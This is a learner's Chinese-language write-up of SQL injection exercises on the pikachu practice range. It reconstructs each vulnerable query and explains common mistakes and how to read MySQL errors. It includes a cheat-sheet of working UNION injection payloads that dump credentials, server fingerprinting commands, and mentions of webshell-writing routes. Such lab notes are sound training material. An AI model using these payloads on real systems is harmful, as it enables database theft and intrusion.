# pikachu · SQL 注入笔记

> 环境：本地 phpstudy（Apache 2.4.39 + PHP 7.3.4 + MySQL 5.7.26）
> 进度：10 关已完成 5 关（数字型 / 字符型 / 搜索型 / xx型 / HTTP 头），另有指纹与文件读写拓展
> 记录方式：打一关记一关，记"为什么"，不只记 payload

---

## 一、五关的结构对照

| 关卡 | 原始 SQL | 闭合 | 列数 |
|---|---|---|---|
| 数字型(post) | `select username,email from member where id=$id` | 无 | 2 |
| 字符型(get) | `select id,email from member where username='$name'` | `'` | 2 |
| 搜索型 | `select username,id,email from member where username like '%$name%'` | `%'` | **3** |
| xx型 | `select id,email from member where username=('$name')` | `')` | 2 |
| HTTP 头 | `insert into httpinfo(...) values('$id','$ip','$ua','$accept','$port')` | 值补位 | 5 个值 |

**共同点**：全部是字符串直接拼接，没有一处预处理。

**不同点只有两个**：注入点在哪、壳有几层。前面四关改的是"闭合方式"，第五关改的是"注入点位置"。

---

## 二、我踩过的坑（按疼的程度排）

### 1. 表名记串：users 和 member

数字型和字符型查的都是 `member`，`users` 是后台账号表。我拿 `from users` 去套 `member` 的字段（pw/sex），MySQL 一句 `Unknown column 'pw' in 'field list'` 把我打回来。

**教训**：报错里 `in 'field list'` = 列名不对，先怀疑表选错了。

### 2. 忘注释，报 `near ''`

字符型闭合了引号，但原句末尾还剩一个 `'`，没被吃掉就是语法错。

```sql
lucy' order by 2      → near ''            ← 少了注释
lucy' order by 2-- -  → 正常
```

`--` 后面**必须有一个空格**；或者用 `#`（URL 里写 `%23`）。

### 3. 不限定 table_schema，串库

```sql
where table_name='users'                      → 捞出 performance_schema 的 USER / CURRENT_CONNECTIONS
where table_schema='pikachu' and table_name='users'   → 干净
```

`information_schema` 是全局字典，不写库名就会串味。

### 4. group_concat 被 1024 字节截断

七条 member 数据带地址邮箱，直接断在中间。两种解法：

```sql
-- 小表逐行
... concat(id,0x3a,username,0x3a,pw) ... limit 0,1
-- 大表分段（必须加 order by，否则每次顺序不同）
substr(group_concat(... order by id),1,900)
```

### 5. URL 里裸空格 → 400

GET 参数里写 `lucy' or '1'='1`，空格是非法字符，Apache 直接 400。
空格 → `%20`，单引号 → `%27`，`#` → `%23`。

### 6. HTTP 头那关，把结果读错列

`insert` 是五个值，我从第 3 个（UA）逃出来之后，表达式落在第 4 位：

```
values('id','ip','x', (select database()), 1 )
       ①    ②   ③         ④             ⑤
```

所以库名在 `httpaccept` 列，不是 `useragent`。第一次读 `useragent` 只看到 `x`，还以为没成功。

### 7. union 里的 order by 不管用

```sql
... from httpinfo order by id desc limit 1     -- 返回随机一条
```

`union` 的 `order by` 作用于合并结果，`id` 按列名解析成第一个 select 的列，不是 `httpinfo.id`。要取最新一条得用子查询：

```sql
-1' union select 1,(select concat(remoteport,0x3a,useragent) from httpinfo order by id desc limit 1)-- -
```

---

## 三、最有用的一个技能：读报错

黑盒里没有源码，报错就是原句的 X 光片。

```sql
输入 lucy'  → near ''lucy'')'
```

从这一条能读出：
- 你闭合了引号（否则不会报在行尾）
- 你的输入后面跟着一个 `)` —— 原句有括号
- 再补 `)` 变成 `near '')'`，说明还差一个引号没吃掉 → 加注释

**报错里的片段，就是原句的一部分。** 拿它跟自己的请求比对：

| 报错片段 | 对应字段 |
|---|---|
| `Mozilla/5.0 ...` | User-Agent |
| `text/html,application/...` | Accept |
| `192.168.x.x` | IP |
| 你输入的字符串 | 参数 |

---

## 四、payload 速查（打完的关）

```sql
-- 数字型（POST）
id=1 order by 2
id=-1 union select 1,2
id=-1 union select 1,database()

-- 字符型（GET）
name=-1' order by 2-- -
name=-1' union select 1,concat(id,0x3a,username,0x3a,pw) from member limit 0,1-- -

-- 搜索型（3 列）
name=-1%' union select 1,2,database()-- -

-- xx型（闭合 ')）
name=-1') union select 1,database()-- -

-- HTTP 头（User-Agent）
x',(select database()),1)#
-- 读取
-1' union select 1,concat(useragent,0x3a,httpaccept,0x3a,remoteport) from httpinfo-- -
```

---

## 五、拓展：指纹与文件读写

```sql
@@version                -- 5.7.26
user()                   -- root@localhost
@@datadir                -- D:\phpstudy_pro\Extensions\MySQL5.7.26\data\
@@version_compile_os     -- Win64
@@secure_file_priv       -- NULL
load_file('C:/Windows/win.ini')   -- 空
```

`secure_file_priv = NULL` 表示文件导入导出**完全禁用**。账号是 root 也没用——这是服务器启动参数，跟账号权限无关。

**这条比库名重要**：它决定后面能不能 `into outfile` 写 webshell，还是只能换路子（日志写马、UDF）。

---

## 六、下一关

```
宽字节 → 布尔盲注 → 时间盲注 → insert/update → delete
```

宽字节考的是 `addslashes` 在 GBK 编码下的经典缺陷：`%df` + `'` 被当成一个汉字，反斜杠被吃掉。

---

*"少就是多，慢就是快。" —— pikachu 作者的话*
